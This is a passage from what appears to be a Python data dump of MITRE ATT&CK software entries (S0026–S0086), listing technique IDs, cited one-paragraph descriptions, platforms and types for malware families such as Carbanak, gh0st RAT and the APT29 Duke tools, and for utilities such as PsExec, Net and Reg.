           'platforms': ['Windows'],
           'software_id': 'S0026',
           'type': 'malware'},
 'S0027': {'attack_ids': ['T1014', 'T1096'],
           'description': '[Zeroaccess](https://attack.mitre.org/software/S0027) is a kernel-mode '
                          '[Rootkit](https://attack.mitre.org/techniques/T1014) that attempts to add victims to the '
                          'ZeroAccess botnet, often for monetary gain. (Citation: Sophos ZeroAccess)',
           'name': 'Zeroaccess',
           'platforms': ['Windows'],
           'software_id': 'S0027',
           'type': 'malware'},
 'S0028': {'attack_ids': ['T1091', 'T1060', 'T1023'],
           'description': '[SHIPSHAPE](https://attack.mitre.org/software/S0028) is malware developed by '
                          '[APT30](https://attack.mitre.org/groups/G0013) that allows propagation and exfiltration of '
                          'data over removable devices. [APT30](https://attack.mitre.org/groups/G0013) may use this '
                          'capability to exfiltrate data across air-gaps. (Citation: FireEye APT30)',
           'name': 'SHIPSHAPE',
           'platforms': ['Windows'],
           'software_id': 'S0028',
           'type': 'malware'},
 'S0029': {'attack_ids': ['T1035', 'T1077'],
           'description': '[PsExec](https://attack.mitre.org/software/S0029) is a free Microsoft tool that can be used '
                          'to execute a program on another computer. It is used by IT administrators and attackers. '
                          '(Citation: Russinovich Sysinternals) (Citation: SANS PsExec)',
           'name': 'PsExec',
           'platforms': ['Windows'],
           'software_id': 'S0029',
           'type': 'tool'},
 'S0030': {'attack_ids': ['T1094',
                          'T1024',
                          'T1055',
                          'T1032',
                          'T1030',
                          'T1059',
                          'T1056',
                          'T1012',
                          'T1003',
                          'T1107',
                          'T1057',
                          'T1114',
                          'T1219',
                          'T1071',
                          'T1136',
                          'T1076',
                          'T1027',
                          'T1113',
                          'T1043',
                          'T1060'],
           'description': '[Carbanak](https://attack.mitre.org/software/S0030) is a full-featured, remote backdoor '
                          'used by a group of the same name ([Carbanak](https://attack.mitre.org/groups/G0008)). It is '
                          'intended for espionage, data exfiltration, and providing remote access to infected '
                          'machines. (Citation: Kaspersky Carbanak) (Citation: FireEye CARBANAK June 2017)',
           'name': 'Carbanak',
           'platforms': ['Windows'],
           'software_id': 'S0030',
           'type': 'malware'},
 'S0031': {'attack_ids': ['T1071',
                          'T1112',
                          'T1090',
                          'T1082',
                          'T1059',
                          'T1060',
                          'T1057',
                          'T1089',
                          'T1001',
                          'T1041',
                          'T1012',
                          'T1083',
                          'T1104',
                          'T1023'],
           'description': '[BACKSPACE](https://attack.mitre.org/software/S0031) is a backdoor used by '
                          '[APT30](https://attack.mitre.org/groups/G0013) that dates back to at least 2005. (Citation: '
                          'FireEye APT30)',
           'name': 'BACKSPACE',
           'platforms': ['Windows'],
           'software_id': 'S0031',
           'type': 'malware'},
 'S0032': {'attack_ids': ['T1107',
                          'T1085',
                          'T1056',
                          'T1032',
                          'T1073',
                          'T1113',
                          'T1057',
                          'T1043',
                          'T1060',
                          'T1070',
                          'T1050',
                          'T1105',
                          'T1059'],
           'description': '[gh0st RAT](https://attack.mitre.org/software/S0032) is a remote access tool (RAT). The '
                          'source code is public and it has been used by multiple groups. (Citation: FireEye Hacking '
                          'Team)(Citation: Arbor Musical Chairs Feb 2018)(Citation: Nccgroup Gh0st April 2018)',
           'name': 'gh0st RAT',
           'platforms': ['Windows', 'macOS'],
           'software_id': 'S0032',
           'type': 'malware'},
 'S0033': {'attack_ids': ['T1056', 'T1010'],
           'description': '[NetTraveler](https://attack.mitre.org/software/S0033) is malware that has been used in '
                          'multiple cyber espionage campaigns for basic surveillance of victims. The earliest known '
                          'samples have timestamps back to 2005, and the largest number of observed samples were '
                          'created between 2010 and 2013. (Citation: Kaspersky NetTraveler)',
           'name': 'NetTraveler',
           'platforms': ['Windows'],
           'software_id': 'S0033',
           'type': 'malware'},
 'S0034': {'attack_ids': ['T1095', 'T1071', 'T1094', 'T1032', 'T1008', 'T1060', 'T1057', 'T1041', 'T1083', 'T1059'],
           'description': '[NETEAGLE](https://attack.mitre.org/software/S0034) is a backdoor developed by '
                          '[APT30](https://attack.mitre.org/groups/G0013) with compile dates as early as 2008. It has '
                          'two main variants known as “Scout” and “Norton.” (Citation: FireEye APT30)',
           'name': 'NETEAGLE',
           'platforms': ['Windows'],
           'software_id': 'S0034',
           'type': 'malware'},
 'S0035': {'attack_ids': ['T1074', 'T1060', 'T1022', 'T1052', 'T1083', 'T1023'],
           'description': '[SPACESHIP](https://attack.mitre.org/software/S0035) is malware developed by '
                          '[APT30](https://attack.mitre.org/groups/G0013) that allows propagation and exfiltration of '
                          'data over removable devices. [APT30](https://attack.mitre.org/groups/G0013) may use this '
                          'capability to exfiltrate data across air-gaps. (Citation: FireEye APT30)',
           'name': 'SPACESHIP',
           'platforms': ['Windows'],
           'software_id': 'S0035',
           'type': 'malware'},
 'S0036': {'attack_ids': ['T1074', 'T1025', 'T1005', 'T1060', 'T1022', 'T1083'],
           'description': '[FLASHFLOOD](https://attack.mitre.org/software/S0036) is malware developed by '
                          '[APT30](https://attack.mitre.org/groups/G0013) that allows propagation and exfiltration of '
                          'data over removable devices. [APT30](https://attack.mitre.org/groups/G0013) may use this '
                          'capability to exfiltrate data across air-gaps. (Citation: FireEye APT30)',
           'name': 'FLASHFLOOD',
           'platforms': ['Windows'],
           'software_id': 'S0036',
           'type': 'malware'},
 'S0037': {'attack_ids': ['T1071', 'T1024', 'T1001', 'T1102', 'T1086', 'T1048', 'T1143'],
           'description': '[HAMMERTOSS](https://attack.mitre.org/software/S0037) is a backdoor that was used by '
                          '[APT29](https://attack.mitre.org/groups/G0016) in 2015. (Citation: FireEye APT29) '
                          '(Citation: F-Secure The Dukes)',
           'name': 'HAMMERTOSS',
           'platforms': ['Windows'],
           'software_id': 'S0037',
           'type': 'malware'},
 'S0038': {'attack_ids': ['T1094',
                          'T1087',
                          'T1055',
                          'T1032',
                          'T1053',
                          'T1002',
                          'T1056',
                          'T1090',
                          'T1022',
                          'T1218',
                          'T1050',
                          'T1134',
                          'T1016',
                          'T1077',
                          'T1057',
                          'T1093',
                          'T1001',
                          'T1071',
                          'T1010',
                          'T1074',
                          'T1043',
                          'T1049',
                          'T1078'],
           'description': '[Duqu](https://attack.mitre.org/software/S0038) is a malware platform that uses a modular '
                          'approach to extend functionality after deployment within a target network. (Citation: '
                          'Symantec W32.Duqu)',
           'name': 'Duqu',
           'platforms': ['Windows'],
           'software_id': 'S0038',
           'type': 'malware'},
 'S0039': {'attack_ids': ['T1124',
                          'T1201',
                          'T1136',
                          'T1018',
                          'T1087',
                          'T1077',
                          'T1007',
                          'T1069',
                          'T1126',
                          'T1135',
                          'T1035',
                          'T1049'],
           'description': 'The [Net](https://attack.mitre.org/software/S0039) utility is a component of the Windows '
                          'operating system. It is used in command-line operations for control of users, groups, '
                          'services, and network connections. (Citation: Microsoft Net Utility)\n'
                          '\n'
                          '[Net](https://attack.mitre.org/software/S0039) has a great deal of functionality, '
                          '(Citation: Savill 1999) much of which is useful for an adversary, such as gathering system '
                          'and network information for Discovery, moving laterally through [Windows Admin '
                          'Shares](https://attack.mitre.org/techniques/T1077) using <code>net use</code> commands, and '
                          'interacting with services. The net1.exe utility is executed for certain functionality when '
                          'net.exe is run and can be used directly in commands such as <code>net1 user</code>.',
           'name': 'Net',
           'platforms': ['Windows'],
           'software_id': 'S0039',
           'type': 'tool'},
 'S0040': {'attack_ids': ['T1090', 'T1014', 'T1055'],
           'description': '[HTRAN](https://attack.mitre.org/software/S0040) is a tool that proxies connections through '
                          'intermediate hops and aids users in disguising their true geographical location. It can be '
                          'used by adversaries to hide their location when interacting with the victim networks. '
                          '(Citation: Operation Quantum Entanglement)(Citation: NCSC Joint Report Public Tools)',
           'name': 'HTRAN',
           'platforms': ['Linux', 'Windows'],
           'software_id': 'S0040',
           'type': 'tool'},
 'S0041': {'attack_ids': ['T1072'],
           'description': '[Wiper](https://attack.mitre.org/software/S0041) is a family of destructive malware used in '
                          'March 2013 during breaches of South Korean banks and media companies. (Citation: Dell '
                          'Wiper)',
           'name': 'Wiper',
           'platforms': ['Windows'],
           'software_id': 'S0041',
           'type': 'malware'},
 'S0042': {'attack_ids': ['T1071', 'T1102', 'T1105', 'T1043'],
           'description': '[LOWBALL](https://attack.mitre.org/software/S0042) is malware used by '
                          '[admin@338](https://attack.mitre.org/groups/G0018). It was used in August 2015 in email '
                          'messages targeting Hong Kong-based media organizations. (Citation: FireEye admin@338)',
           'name': 'LOWBALL',
           'platforms': ['Windows'],
           'software_id': 'S0042',
           'type': 'malware'},
 'S0043': {'attack_ids': ['T1095', 'T1071', 'T1082'],
           'description': '[BUBBLEWRAP](https://attack.mitre.org/software/S0043) is a full-featured, second-stage '
                          'backdoor used by the [admin@338](https://attack.mitre.org/groups/G0018) group. It is set to '
                          'run when the system boots and includes functionality to check, upload, and register '
                          'plug-ins that can further enhance its capabilities. (Citation: FireEye admin@338)',
           'name': 'BUBBLEWRAP',
           'platforms': ['Windows'],
           'software_id': 'S0043',
           'type': 'malware'},
 'S0044': {'attack_ids': ['T1055',
                          'T1053',
                          'T1122',
                          'T1068',
                          'T1085',
                          'T1082',
                          'T1132',
                          'T1050',
                          'T1107',
                          'T1016',
                          'T1037',
                          'T1057',
                          'T1064',
                          'T1105',
                          'T1071',
                          'T1027',
                          'T1008',
                          'T1060',
                          'T1113',
                          'T1115'],
           'description': '[JHUHUGIT](https://attack.mitre.org/software/S0044) is malware used by '
                          '[APT28](https://attack.mitre.org/groups/G0007). It is based on Carberp source code and '
                          'serves as reconnaissance malware. (Citation: Kaspersky Sofacy) (Citation: F-Secure Sofacy '
                          '2015) (Citation: ESET Sednit Part 1) (Citation: FireEye APT28 January 2017)',
           'name': 'JHUHUGIT',
           'platforms': ['Windows'],
           'software_id': 'S0044',
           'type': 'malware'},
 'S0045': {'attack_ids': ['T1032',
                          'T1106',
                          'T1122',
                          'T1029',
                          'T1002',
                          'T1059',
                          'T1085',
                          'T1056',
                          'T1082',
                          'T1132',
                          'T1022',
                          'T1012',
                          'T1107',
                          'T1057',
                          'T1083',
                          'T1071',
                          'T1074',
                          'T1027',
                          'T1112',
                          'T1060',
                          'T1043',
                          'T1041',
                          'T1120'],
           'description': '[ADVSTORESHELL](https://attack.mitre.org/software/S0045) is a spying backdoor that has been '
                          'used by [APT28](https://attack.mitre.org/groups/G0007) from at least 2012 to 2016. It is '
                          'generally used for long-term espionage and is deployed on targets deemed interesting after '
                          'a reconnaissance phase. (Citation: Kaspersky Sofacy) (Citation: ESET Sednit Part 2)',
           'name': 'ADVSTORESHELL',
           'platforms': ['Windows'],
           'software_id': 'S0045',
           'type': 'malware'},
 'S0046': {'attack_ids': ['T1071',
                          'T1003',
                          'T1027',
                          'T1085',
                          'T1053',
                          'T1082',
                          'T1060',
                          'T1036',
                          'T1102',
                          'T1063',
                          'T1497',
                          'T1050',
                          'T1059'],
           'description': '[CozyCar](https://attack.mitre.org/software/S0046) is malware that was used by '
                          '[APT29](https://attack.mitre.org/groups/G0016) from 2010 to 2015. It is a modular malware '
                          'platform, and its backdoor component can be instructed to download and execute a variety of '
                          'modules with different functionality. (Citation: F-Secure The Dukes)',
           'name': 'CozyCar',
           'platforms': ['Windows'],
           'software_id': 'S0046',
           'type': 'malware'},
 'S0047': {'attack_ids': ['T1019', 'T1014'],
           'description': '[Hacking Team UEFI Rootkit](https://attack.mitre.org/software/S0047) is a rootkit developed '
                          'by the company Hacking Team as a method of persistence for remote access software. '
                          '(Citation: TrendMicro Hacking Team UEFI)',
           'name': 'Hacking Team UEFI Rootkit',
           'platforms': [],
           'software_id': 'S0047',
           'type': 'malware'},
 'S0048': {'attack_ids': ['T1071', 'T1003', 'T1082', 'T1005', 'T1083'],
           'description': '[PinchDuke](https://attack.mitre.org/software/S0048) is malware that was used by '
                          '[APT29](https://attack.mitre.org/groups/G0016) from 2008 to 2010. (Citation: F-Secure The '
                          'Dukes)',
           'name': 'PinchDuke',
           'platforms': ['Windows'],
           'software_id': 'S0048',
           'type': 'malware'},
 'S0049': {'attack_ids': ['T1071', 'T1016', 'T1087', 'T1007', 'T1057', 'T1083'],
           'description': '[GeminiDuke](https://attack.mitre.org/software/S0049) is malware that was used by '
                          '[APT29](https://attack.mitre.org/groups/G0016) from 2009 to 2012. (Citation: F-Secure The '
                          'Dukes)',
           'name': 'GeminiDuke',
           'platforms': ['Windows'],
           'software_id': 'S0049',
           'type': 'malware'},
 'S0050': {'attack_ids': ['T1071',
                          'T1048',
                          'T1003',
                          'T1024',
                          'T1020',
                          'T1068',
                          'T1056',
                          'T1053',
                          'T1025',
                          'T1113',
                          'T1005',
                          'T1114',
                          'T1039',
                          'T1083',
                          'T1050',
                          'T1115'],
           'description': '[CosmicDuke](https://attack.mitre.org/software/S0050) is malware that was used by '
                          '[APT29](https://attack.mitre.org/groups/G0016) from 2010 to 2015. (Citation: F-Secure The '
                          'Dukes)',
           'name': 'CosmicDuke',
           'platforms': ['Windows'],
           'software_id': 'S0050',
           'type': 'malware'},
 'S0051': {'attack_ids': ['T1105', 'T1071', 'T1008', 'T1102'],
           'description': '[MiniDuke](https://attack.mitre.org/software/S0051) is malware that was used by '
                          '[APT29](https://attack.mitre.org/groups/G0016) from 2010 to 2015. The '
                          '[MiniDuke](https://attack.mitre.org/software/S0051) toolset consists of multiple downloader '
                          'and backdoor components. The loader has been used with other '
                          '[MiniDuke](https://attack.mitre.org/software/S0051) components as well as in conjunction '
                          'with [CosmicDuke](https://attack.mitre.org/software/S0050) and '
                          '[PinchDuke](https://attack.mitre.org/software/S0048). (Citation: F-Secure The Dukes)',
           'name': 'MiniDuke',
           'platforms': ['Windows'],
           'software_id': 'S0051',
           'type': 'malware'},
 'S0052': {'attack_ids': ['T1071', 'T1003', 'T1102'],
           'description': '[OnionDuke](https://attack.mitre.org/software/S0052) is malware that was used by '
                          '[APT29](https://attack.mitre.org/groups/G0016) from 2013 to 2015. (Citation: F-Secure The '
                          'Dukes)',
           'name': 'OnionDuke',
           'platforms': ['Windows'],
           'software_id': 'S0052',
           'type': 'malware'},
 'S0053': {'attack_ids': ['T1071',
                          'T1078',
                          'T1107',
                          'T1023',
                          'T1032',
                          'T1132',
                          'T1060',
                          'T1114',
                          'T1064',
                          'T1045',
                          'T1084',
                          'T1086',
                          'T1002',
                          'T1097',
                          'T1105',
                          'T1059'],
           'description': '[SeaDuke](https://attack.mitre.org/software/S0053) is malware that was used by '
                          '[APT29](https://attack.mitre.org/groups/G0016) from 2014 to 2015. It was used primarily as '
                          'a secondary backdoor for victims that were already compromised with '
                          '[CozyCar](https://attack.mitre.org/software/S0046). (Citation: F-Secure The Dukes)',
           'name': 'SeaDuke',
           'platforms': ['Windows'],
           'software_id': 'S0053',
           'type': 'malware'},
 'S0054': {'attack_ids': ['T1071', 'T1102', 'T1105'],
           'description': '[CloudDuke](https://attack.mitre.org/software/S0054) is malware that was used by '
                          '[APT29](https://attack.mitre.org/groups/G0016) in 2015. (Citation: F-Secure The Dukes) '
                          '(Citation: Securelist Minidionis July 2015)',
           'name': 'CloudDuke',
           'platforms': ['Windows'],
           'software_id': 'S0054',
           'type': 'malware'},
 'S0055': {'attack_ids': ['T1083', 'T1071', 'T1105', 'T1055'],
           'description': '[RARSTONE](https://attack.mitre.org/software/S0055) is malware used by the '
                          '[Naikon](https://attack.mitre.org/groups/G0019) group that has some characteristics similar '
                          'to [PlugX](https://attack.mitre.org/software/S0013). (Citation: Aquino RARSTONE)',
           'name': 'RARSTONE',
           'platforms': ['Windows'],
           'software_id': 'S0055',
           'type': 'malware'},
 'S0056': {'attack_ids': ['T1110', 'T1035', 'T1077', 'T1003'],
           'description': '[Net Crawler](https://attack.mitre.org/software/S0056) is an intranet worm capable of '
                          'extracting credentials using credential dumpers and spreading to systems on a network over '
                          'SMB by brute forcing accounts with recovered passwords and using '
                          '[PsExec](https://attack.mitre.org/software/S0029) to execute a copy of [Net '
                          'Crawler](https://attack.mitre.org/software/S0056). (Citation: Cylance Cleaver)',
           'name': 'Net Crawler',
           'platforms': ['Windows'],
           'software_id': 'S0056',
           'type': 'malware'},
 'S0057': {'attack_ids': ['T1063', 'T1007', 'T1057'],
           'description': 'The [Tasklist](https://attack.mitre.org/software/S0057) utility displays a list of '
                          'applications and services with their Process IDs (PID) for all tasks running on either a '
                          'local or a remote computer. It is packaged with Windows operating systems and can be '
                          'executed from the command-line interface. (Citation: Microsoft Tasklist)',
           'name': 'Tasklist',
           'platforms': ['Windows'],
           'software_id': 'S0057',
           'type': 'tool'},
 'S0058': {'attack_ids': ['T1134', 'T1056', 'T1082', 'T1008', 'T1060', 'T1036', 'T1089', 'T1033', 'T1023'],
           'description': '[SslMM](https://attack.mitre.org/software/S0058) is a full-featured backdoor used by '
                          '[Naikon](https://attack.mitre.org/groups/G0019) that has multiple variants. (Citation: '
                          'Baumgartner Naikon 2015)',
           'name': 'SslMM',
           'platforms': ['Windows'],
           'software_id': 'S0058',
           'type': 'malware'},
 'S0059': {'attack_ids': ['T1071', 'T1082', 'T1008', 'T1057', 'T1083', 'T1033'],
           'description': '[WinMM](https://attack.mitre.org/software/S0059) is a full-featured, simple backdoor used '
                          'by [Naikon](https://attack.mitre.org/groups/G0019). (Citation: Baumgartner Naikon 2015)',
           'name': 'WinMM',
           'platforms': ['Windows'],
           'software_id': 'S0059',
           'type': 'malware'},
 'S0060': {'attack_ids': ['T1071', 'T1024', 'T1016', 'T1082', 'T1069', 'T1033'],
           'description': '[Sys10](https://attack.mitre.org/software/S0060) is a backdoor that was used throughout '
                          '2013 by [Naikon](https://attack.mitre.org/groups/G0019). (Citation: Baumgartner Naikon '
                          '2015)',
           'name': 'Sys10',
           'platforms': ['Windows'],
           'software_id': 'S0060',
           'type': 'malware'},
 'S0061': {'attack_ids': ['T1089', 'T1046'],
           'description': '[HDoor](https://attack.mitre.org/software/S0061) is malware that has been customized and '
                          'used by the [Naikon](https://attack.mitre.org/groups/G0019) group. (Citation: Baumgartner '
                          'Naikon 2015)',
           'name': 'HDoor',
           'platforms': ['Windows'],
           'software_id': 'S0061',
           'type': 'malware'},
 'S0062': {'attack_ids': ['T1047',
                          'T1071',
                          'T1027',
                          'T1056',
                          'T1082',
                          'T1091',
                          'T1008',
                          'T1060',
                          'T1057',
                          'T1083',
                          'T1063',
                          'T1105'],
           'description': '[DustySky](https://attack.mitre.org/software/S0062) is multi-stage malware written in .NET '
                          'that has been used by [Molerats](https://attack.mitre.org/groups/G0021) since May 2015. '
                          '(Citation: DustySky) (Citation: DustySky2)',
           'name': 'DustySky',
           'platforms': ['Windows'],
           'software_id': 'S0062',
           'type': 'malware'},
 'S0063': {'attack_ids': ['T1018', 'T1027', 'T1087', 'T1057', 'T1083', 'T1049'],
           'description': '[SHOTPUT](https://attack.mitre.org/software/S0063) is a custom backdoor used by '
                          '[APT3](https://attack.mitre.org/groups/G0022). (Citation: FireEye Clandestine Wolf)',
           'name': 'SHOTPUT',
           'platforms': ['Windows'],
           'software_id': 'S0063',
           'type': 'malware'},
 'S0064': {'attack_ids': ['T1083', 'T1071', 'T1057', 'T1043'],
           'description': '[ELMER](https://attack.mitre.org/software/S0064) is a non-persistent, proxy-aware HTTP '
                          'backdoor written in Delphi that has been used by '
                          '[APT16](https://attack.mitre.org/groups/G0023). (Citation: FireEye EPS Awakens Part 2)',
           'name': 'ELMER',
           'platforms': ['Windows'],
           'software_id': 'S0064',
           'type': 'malware'},
 'S0065': {'attack_ids': ['T1071', 'T1024', 'T1082', 'T1057', 'T1083', 'T1059'],
           'description': '[4H RAT](https://attack.mitre.org/software/S0065) is malware that has been used by [Putter '
                          'Panda](https://attack.mitre.org/groups/G0024) since at least 2007. (Citation: CrowdStrike '
                          'Putter Panda)',
           'name': '4H RAT',
           'platforms': ['Windows'],
           'software_id': 'S0065',
           'type': 'malware'},
 'S0066': {'attack_ids': ['T1071', 'T1024', 'T1032', 'T1108', 'T1083', 'T1099'],
           'description': '[3PARA RAT](https://attack.mitre.org/software/S0066) is a remote access tool (RAT) '
                          'programmed in C++ that has been used by [Putter '
                          'Panda](https://attack.mitre.org/groups/G0024). (Citation: CrowdStrike Putter Panda)',
           'name': '3PARA RAT',
           'platforms': ['Windows'],
           'software_id': 'S0066',
           'type': 'malware'},
 'S0067': {'attack_ids': ['T1071', 'T1107', 'T1081'],
           'description': '[pngdowner](https://attack.mitre.org/software/S0067) is malware used by [Putter '
                          'Panda](https://attack.mitre.org/groups/G0024). It is a simple tool with limited '
                          'functionality and no persistence mechanism, suggesting it is used only as a simple '
                          '"download-and-\n'
                          'execute" utility. (Citation: CrowdStrike Putter Panda)',
           'name': 'pngdowner',
           'platforms': ['Windows'],
           'software_id': 'S0067',
           'type': 'malware'},
 'S0068': {'attack_ids': ['T1071', 'T1024', 'T1059'],
           'description': '[httpclient](https://attack.mitre.org/software/S0068) is malware used by [Putter '
                          'Panda](https://attack.mitre.org/groups/G0024). It is a simple tool that provides a limited '
                          'range of functionality, suggesting it is likely used as a second-stage or '
                          'supplementary/backup tool. (Citation: CrowdStrike Putter Panda)',
           'name': 'httpclient',
           'platforms': ['Windows'],
           'software_id': 'S0068',
           'type': 'malware'},
 'S0069': {'attack_ids': ['T1107', 'T1057', 'T1102', 'T1083', 'T1104', 'T1059'],
           'description': '[BLACKCOFFEE](https://attack.mitre.org/software/S0069) is malware that has been used by '
                          'several Chinese groups since at least 2013. (Citation: FireEye APT17) (Citation: FireEye '
                          'Periscope March 2018)',
           'name': 'BLACKCOFFEE',
           'platforms': ['Windows'],
           'software_id': 'S0069',
           'type': 'malware'},
 'S0070': {'attack_ids': ['T1071',
                          'T1107',
                          'T1027',
                          'T1056',
                          'T1038',
                          'T1060',
                          'T1043',
                          'T1073',
                          'T1036',
                          'T1083',
                          'T1105',
                          'T1059'],
           'description': '[HTTPBrowser](https://attack.mitre.org/software/S0070) is malware that has been used by '
                          'several threat groups. (Citation: ThreatStream Evasion Analysis) (Citation: Dell TG-3390) '
                          'It is believed to be of Chinese origin. (Citation: ThreatConnect Anthem)',
           'name': 'HTTPBrowser',
           'platforms': ['Windows'],
           'software_id': 'S0070',
           'type': 'malware'},
 'S0071': {'attack_ids': ['T1050', 'T1059'],
           'description': '[hcdLoader](https://attack.mitre.org/software/S0071) is a remote access tool (RAT) that has '
                          'been used by [APT18](https://attack.mitre.org/groups/G0026). (Citation: Dell Lateral '
                          'Movement)',
           'name': 'hcdLoader',
           'platforms': ['Windows'],
           'software_id': 'S0071',
           'type': 'malware'},
 'S0072': {'attack_ids': ['T1071', 'T1056', 'T1073', 'T1036', 'T1100', 'T1022', 'T1083', 'T1099'],
           'description': '[OwaAuth](https://attack.mitre.org/software/S0072) is a Web shell and credential stealer '
                          'deployed to Microsoft Exchange servers that appears to be exclusively used by [Threat '
                          'Group-3390](https://attack.mitre.org/groups/G0027). (Citation: Dell TG-3390)',
           'name': 'OwaAuth',
           'platforms': ['Windows'],
           'software_id': 'S0072',
           'type': 'malware'},
 'S0073': {'attack_ids': ['T1100'],
           'description': '[ASPXSpy](https://attack.mitre.org/software/S0073) is a Web shell. It has been modified by '
                          '[Threat Group-3390](https://attack.mitre.org/groups/G0027) actors to create the ASPXTool '
                          'version. (Citation: Dell TG-3390)',
           'name': 'ASPXSpy',
           'platforms': ['Windows'],
           'software_id': 'S0073',
           'type': 'malware'},
 'S0074': {'attack_ids': ['T1071',
                          'T1107',
                          'T1024',
                          'T1027',
                          'T1085',
                          'T1073',
                          'T1060',
                          'T1088',
                          'T1050',
                          'T1105',
                          'T1059'],
           'description': '[Sakula](https://attack.mitre.org/software/S0074) is a remote access tool (RAT) that first '
                          'surfaced in 2012 and was used in intrusions throughout 2015. (Citation: Dell Sakula)',
           'name': 'Sakula',
           'platforms': ['Windows'],
           'software_id': 'S0074',
           'type': 'malware'},
 'S0075': {'attack_ids': ['T1012', 'T1214', 'T1112'],
           'description': '[Reg](https://attack.mitre.org/software/S0075) is a Windows utility used to interact with '
                          'the Windows Registry. It can be used at the command-line interface to query, add, modify, '
                          'and remove information. (Citation: Microsoft Reg)\n'
                          '\n'
                          'Utilities such as [Reg](https://attack.mitre.org/software/S0075) are known to be used by '
                          'persistent threats. (Citation: Windows Commands JPCERT)',
           'name': 'Reg',
           'platforms': ['Windows'],
           'software_id': 'S0075',
           'type': 'tool'},
 'S0076': {'attack_ids': ['T1071', 'T1024', 'T1032', 'T1056', 'T1001'],
           'description': '[FakeM](https://attack.mitre.org/software/S0076) is a shellcode-based Windows backdoor that '
                          'has been used by [Scarlet Mimic](https://attack.mitre.org/groups/G0029). (Citation: Scarlet '
                          'Mimic Jan 2016)',
           'name': 'FakeM',
           'platforms': ['Windows'],
           'software_id': 'S0076',
           'type': 'malware'},
 'S0077': {'attack_ids': ['T1032', 'T1041', 'T1105', 'T1059'],
           'description': '[CallMe](https://attack.mitre.org/software/S0077) is a Trojan designed to run on Apple OSX. '
                          'It is based on a publicly available tool called Tiny SHell. (Citation: Scarlet Mimic Jan '
                          '2016)',
           'name': 'CallMe',
           'platforms': ['macOS'],
           'software_id': 'S0077',
           'type': 'malware'},
 'S0078': {'attack_ids': ['T1071', 'T1041', 'T1083', 'T1099', 'T1105'],
           'description': '[Psylo](https://attack.mitre.org/software/S0078) is a shellcode-based Trojan that has been '
                          'used by [Scarlet Mimic](https://attack.mitre.org/groups/G0029). It has similar '
                          'characteristics as [FakeM](https://attack.mitre.org/software/S0076). (Citation: Scarlet '
                          'Mimic Jan 2016)',
           'name': 'Psylo',
           'platforms': ['Windows'],
           'software_id': 'S0078',
           'type': 'malware'},
 'S0079': {'attack_ids': ['T1217', 'T1032', 'T1082', 'T1005', 'T1057', 'T1041', 'T1083', 'T1065', 'T1105'],
           'description': '[MobileOrder](https://attack.mitre.org/software/S0079) is a Trojan intended to compromise '
                          'Android mobile devices. It has been used by [Scarlet '
                          'Mimic](https://attack.mitre.org/groups/G0029). (Citation: Scarlet Mimic Jan 2016)',
           'name': 'MobileOrder',
           'platforms': [],
           'software_id': 'S0079',
           'type': 'malware'},
 'S0080': {'attack_ids': ['T1003', 'T1060', 'T1043', 'T1105', 'T1059'],
           'description': '[Mivast](https://attack.mitre.org/software/S0080) is a backdoor that has been used by [Deep '
                          'Panda](https://attack.mitre.org/groups/G0009). It was reportedly used in the Anthem breach. '
                          '(Citation: Symantec Black Vine)',
           'name': 'Mivast',
           'platforms': ['Windows'],
           'software_id': 'S0080',
           'type': 'malware'},
 'S0081': {'attack_ids': ['T1055',
                          'T1087',
                          'T1032',
                          'T1007',
                          'T1085',
                          'T1082',
                          'T1132',
                          'T1036',
                          'T1099',
                          'T1050',
                          'T1016',
                          'T1107',
                          'T1057',
                          'T1083',
                          'T1105',
                          'T1071',
                          'T1074',
                          'T1027',
                          'T1060'],
           'description': '[Elise](https://attack.mitre.org/software/S0081) is a custom backdoor Trojan that appears '
                          'to be used exclusively by [Lotus Blossom](https://attack.mitre.org/groups/G0030). It is '
                          'part of a larger group of\n'
                          'tools referred to as LStudio, ST Group, and APT0LSTU. (Citation: Lotus Blossom Jun '
                          '2015)(Citation: Accenture Dragonfish Jan 2018)',
           'name': 'Elise',
           'platforms': ['Windows'],
           'software_id': 'S0081',
           'type': 'malware'},
 'S0082': {'attack_ids': ['T1071',
                          'T1009',
                          'T1055',
                          'T1016',
                          'T1024',
                          'T1085',
                          'T1027',
                          'T1082',
                          'T1007',
                          'T1069',
                          'T1060',
                          'T1050',
                          'T1105',
                          'T1059'],
           'description': '[Emissary](https://attack.mitre.org/software/S0082) is a Trojan that has been used by '
                          '[Lotus Blossom](https://attack.mitre.org/groups/G0030). It shares code with '
                          '[Elise](https://attack.mitre.org/software/S0081), with both Trojans being part of a malware '
                          'group referred to as LStudio. (Citation: Lotus Blossom Dec 2015)',
           'name': 'Emissary',
           'platforms': ['Windows'],
           'software_id': 'S0082',
           'type': 'malware'},
 'S0083': {'attack_ids': ['T1095',
                          'T1094',
                          'T1107',
                          'T1082',
                          'T1132',
                          'T1043',
                          'T1036',
                          'T1070',
                          'T1083',
                          'T1099',
                          'T1105',
                          'T1059'],
           'description': '[Misdat](https://attack.mitre.org/software/S0083) is a backdoor that was used by [Dust '
                          'Storm](https://attack.mitre.org/groups/G0031) from 2010 to 2011. (Citation: Cylance Dust '
                          'Storm)',
           'name': 'Misdat',
           'platforms': ['Windows'],
           'software_id': 'S0083',
           'type': 'malware'},
 'S0084': {'attack_ids': ['T1095',
                          'T1071',
                          'T1136',
                          'T1016',
                          'T1094',
                          'T1087',
                          'T1082',
                          'T1132',
                          'T1008',
                          'T1043',
                          'T1036',
                          'T1033',
                          'T1059'],
           'description': '[Mis-Type](https://attack.mitre.org/software/S0084) is a backdoor hybrid that was used by '
                          '[Dust Storm](https://attack.mitre.org/groups/G0031) in 2012. (Citation: Cylance Dust Storm)',
           'name': 'Mis-Type',
           'platforms': ['Windows'],
           'software_id': 'S0084',
           'type': 'malware'},
 'S0085': {'attack_ids': ['T1071',
                          'T1136',
                          'T1087',
                          'T1082',
                          'T1132',
                          'T1007',
                          'T1008',
                          'T1060',
                          'T1043',
                          'T1036',
                          'T1023'],
           'description': '[S-Type](https://attack.mitre.org/software/S0085) is a backdoor that was used by [Dust '
                          'Storm](https://attack.mitre.org/groups/G0031) from 2013 to 2014. (Citation: Cylance Dust '
                          'Storm)',
           'name': 'S-Type',
           'platforms': ['Windows'],
           'software_id': 'S0085',
           'type': 'malware'},
 'S0086': {'attack_ids': ['T1071', 'T1082', 'T1007', 'T1113', 'T1036', 'T1083', 'T1002', 'T1050', 'T1105', 'T1059'],
           'description': '[ZLib](https://attack.mitre.org/software/S0086) is a full-featured backdoor that was used '
                          'as a second-stage implant by [Dust Storm](https://attack.mitre.org/groups/G0031) from 2014 '
                          'to 2015. It is malware and should not be confused with the compression library from which '
                          'its name is derived. (Citation: Cylance Dust Storm)',
